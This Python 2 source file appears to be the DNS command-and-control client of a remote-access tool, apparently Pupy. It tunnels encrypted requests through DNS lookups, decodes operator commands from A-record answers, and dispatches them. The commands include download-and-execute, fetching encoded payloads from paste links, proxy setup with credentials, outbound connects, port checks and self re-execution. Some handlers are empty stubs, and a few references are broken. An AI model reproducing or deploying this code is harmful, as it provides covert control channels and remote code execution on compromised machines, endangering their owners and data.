# -*- coding: utf-8 -*-

import struct
import socket
import base64
import string
import hashlib
import tinyec
import os
import platform
import random
import sys
import ascii85
import zlib
import tempfile
import subprocess
import logging
import urllib
import urllib2

from ecpv import ECPV
from picocmd import *

from threading import Thread, Lock

class TCPFile(StringIO.StringIO):
    pass

class TCPReaderHandler(urllib2.BaseHandler):
    def tcp_open(self, req):
        addr = req.get_host().rsplit(':', 1)
        host = addr[0]
        if len(addr) == 1:
            port = 53
        else:
            port = addr[1]

        data = []
        conn = socket.create_connection((host, port))
        conn.settimeout(30)

        try:
            while True:
                b = conn.recv(65535)
                if not b:
                    break

                data.append(b)

            if not data:
                raise ValueError('No data')
        except:
            pass

        data = b''.join(data)

        fp = TCPFile(data)
        if data:
            headers = {
                'Content-type': 'application/octet-stream',
                'Content-length': len(data),
            }
            code = 200
        else:
            headers = {}
            code = 404

        return urllib.addinfourl(fp, headers, req.get_full_url(), code=code)

urllib2.install_opener(
    urllib2.build_opener(TCPReaderHandler())
)

class DnsCommandClientDecodingError(Exception):
    pass

__DEBUG = 1

if __DEBUG:
    import dns.resolver
    resolver = dns.resolver.Resolver()
    resolver.nameservers = [ '127.0.0.1' ]
    resolver.port = 5454
    socket.gethostbyname_ex = lambda x: (None, None, [
        str(rdata) for rdata in resolver.query(x, 'A')
    ])

class DnsCommandsClient(Thread):
    def __init__(self, domain, key):
        self.domains = domain.split(',')
        self.domain_id = 0
        self.domain = self.domains[self.domain_id]
        self.translation = dict(zip(
            ''.join([
                ''.join([chr(x) for x in xrange(ord('A'), ord('Z') + 1)]),
                ''.join([chr(x) for x in xrange(ord('0'), ord('9') + 1)]),
                '=',
            ]),
            ''.join([
                ''.join([chr(x) for x in xrange(ord('a'), ord('z') + 1)]),
                '-',
                ''.join([chr(x) for x in xrange(ord('0'), ord('9') + 1)]),
            ])))
        self.encoder = ECPV(public_key=key)
        self.spi = None
        self.kex = None
        self.nonce = random.randrange(0, 1<<32-1)
        self.poll = 60
        self.active = True
        self.failed = 0
        self.proxy = None
        self._request_lock = Lock()

        Thread.__init__(self)

    def next(self):
        self.domain_id = ( self.domain_id + 1 ) % len(self.domains)
        self.domain = self.domains[self.domain_id]
        self.failed = 0

    def event(self, command):
        logging.debug('Event: {}'.format(command))
        self._request(command)

    def _a_page_decoder(self, addresses, nonce, symmetric=None):
        if symmetric is None:
            symmetric = self.encoder.kex_completed

        resp = len(addresses)*[None]
        for address in addresses:
            raw = 0
            for part in [ int(x) << (3-i)*8 for i,x in enumerate(address.split('.')) ]:
                raw |= part

            idx = (raw & 0x1E000000) >> 25
            bits = (raw & 0x01FFFFFE) >> 1
            resp[idx] = struct.pack('>I', bits)[1:]

        data = b''.join(resp)
        length = struct.unpack_from('B', data)[0]
        payload = data[1:1+length]

        decoded = None

        try:
            decoded = self.encoder.decode(payload, nonce, symmetric)
        except Exception as e:
            logging.exception(e)
            raise DnsCommandClientDecodingError

        return decoded

    def _q_page_encoder(self, data):
        if len(data) > 35:
            raise ValueError('Too big page size')

        nonce = self.nonce
        encoded = '.'.join([
            ''.join([
                self.translation[x] for x in base64.b32encode(part)
            ]) for part in [
                struct.pack('>I', self.spi) if self.spi else None,
                struct.pack('>I', nonce),
                self.encoder.encode(data, nonce, symmetric=True)
            ] if part is not None
        ]) + '.' + self.domain

        self.nonce += len(encoded)
        return encoded, nonce

    def _request(self, *commands):
        with self._request_lock:
            return self._request_unsafe(commands)

    def _request_unsafe(self, commands):
        parcel = Parcel(*commands)
        page, nonce = self._q_page_encoder(parcel.pack())

        try:
            _, _, addresses = socket.gethostbyname_ex(page)
            if len(addresses) < 2:
                logging.warning('DNSCNC: short answer: {}'.format(addresses))
                return []

        except socket.error as e:
            logging.error('DNSCNC: Communication error: {}'.format(e))
            self.next()
            return []

        response = None

        try:
            response = Parcel.unpack(
                self._a_page_decoder(addresses, nonce)
            )

            self.failed = 0
        except ParcelInvalidCrc:
            logging.error('CRC FAILED / Fallback to Public-key decoding')

            try:
                response = Parcel.unpack(
                    self._a_page_decoder(addresses, nonce, False)
                )

                self.spi = None
                self.encoder.kex_reset()
                self.on_session_lost()

            except ParcelInvalidCrc:
                logging.error(
                    'CRC FAILED / Fallback failed also / CRC / {}/{}'.format(
                        self.failed, 5
                    )
                )
                self.failed += 1
                if self.failed > 5:
                    self.next()
                return []

            except ParcelInvalidPayload:
                logging.error(
                    'CRC FAILED / Fallback failed also / Invalid payload / {}/{}'.format(
                        self.failed, 5
                    )
                )
                self.failed += 1
                if self.failed > 5:
                    self.next()
                return []

        return response.commands

    def on_pastelink(self, url, action, encoder):
        proxy = urllib2.ProxyHandler()
        opener = urllib2.build_opener(proxy)
        response = opener.open(url)
        if response.code == 200:
            try:
                content = response.read()
                content = ascii85.ascii85DecodeDG(content)
                content = self.encoder.unpack(content)
                content = zlib.decompress(content)
                chash, content = content[:20], content[20:]
                h = hashlib.sha1()
                h.update(content)
                if h.digest() == chash:
                    self.on_pastelink_content(url, action, content)
                else:
                    logging.error('PasteLink: Wrong hash after extraction: {} != {}'.format(
                        h.digest(), chash))
            except Exception as e:
                logging.exception(e)

    def on_downloadexec(self, url, action, use_proxy):
        if use_proxy:
            opener = urllib2.build_opener(urllib2.ProxyHandler()).open
        else:
            opener = urllib2.urlopen

        try:
            response = opener(url)
            if response.code == 200:
                self.on_downloadexec_content(url, action, response.read())

        except Exception as e:
            logging.exception(e)

    def on_pastelink_content(self, url, action, content):
        pass

    def on_downloadexec_content(self, url, action, content):
        pass

    def on_connect(self, ip, port, transport):
        pass

    def on_checkconnect(self, host, port_start, port_end):
        pass

    def on_checkonline(self):
        pass

    def on_exit(self):
        self.active = False

    def on_disconnect(self):
        pass

    def on_error(self, error, message=None):
        pass

    def on_session_established(self):
        pass

    def on_session_lost(self):
        pass

    def on_set_proxy(self, scheme, ip, port, user, password):
        if not scheme or scheme.lower() == 'none':
            self.proxy = None
        elif scheme.lower() == 'any':
            self.proxy = True
        else:
            if user and password:
                auth = '{}:{}@'.format(user, password)
            else:
                auth = ''

            self.proxy = '{}://{}{}:{}'.format(scheme, auth, ip, port)

    def process(self):
        if self.spi:
            commands = list(self._request(SystemStatus()))
        else:
            commands = list(self._request(Poll()))

    	logging.debug('commands: {}'.format(commands))
        ack = self._request(Ack(len(commands)))
        if not ( len(ack) == 1 and isinstance(ack[0], Ack)):
            logging.error('ACK <-> ACK failed: received: {}'.format(ack))

        for command in commands:
            responses = []
            if isinstance(command, Policy):
                self.poll = command.poll

                if command.kex and not self.spi:
                    request = self.encoder.generate_kex_request()
                    kex = Kex(request)
                    response = self._request(kex)
                    if not len(response) == 1 or not isinstance(response[0], Kex):
                    	logging.error('KEX sequence failed. Got {} instead of Kex'.format(
                            response))
                        return

                    key = self.encoder.process_kex_response(response[0].parcel)
                    self.spi = kex.spi
                    self.on_session_established()
            elif isinstance(command, Poll):
                ack = self._request(SystemInfo())
                if not len(response) == 1 and not isinstance(response[0], Ack):
                    logging.error('SystemInfo: ACK expected but {} found'.format(
                        response))
                ack = self._request(SystemStatus())
                if not len(response) == 1 and not isinstance(response[0], Ack):
                    logging.error('SystemInfo: ACK expected but {} found'.format(
                        response))
            elif isinstance(command, PasteLink):
                self.on_pastelink(command.url, command.action, self.encoder)
            elif isinstance(command, DownloadExec):
                self.on_downloadexec(command.url, command.action, command.proxy)
            elif isinstance(command, SetProxy):
                self.on_set_proxy(
                    command.scheme, command.ip, command.port,
                    command.user, command.password
                )
            elif isinstance(command, Connect):
                self.on_connect(
                    str(command.ip),
                    int(command.port),
                    transport=command.transport,
                    proxy=self.proxy
                )
            elif isinstance(command, Error):
                self.on_error(command.error, command.message)
            elif isinstance(command, Disconnect):
                self.on_disconnect()
            elif isinstance(command, Sleep):
                time.sleep(command.timeout)
            elif isinstance(command, CheckConnect):
                self.on_checkconnect(command.host, command.port_start, port_end=command.port_end)
            elif isinstance(command, OnlineStatusRequest):
                self.on_checkonline()
            elif isinstance(command, Reexec):
                try:
                    executable = os.readlink('/proc/self/exe')
                    args = open('/proc/self/cmdline').read().split('\x00')
                except:
                    executable = sys.executable
                    args = sys.argv

                os.execv(executable, args)
            elif isinstance(command, Exit):
                self.active = False
                self.on_exit()

    def run(self):
        while True:
            try:
                self.process()
            except Exception as e:
                logging.exception(e)

            if self.active:
            	logging.debug('sleep {}'.format(self.poll))
                time.sleep(self.poll)
            else:
                break
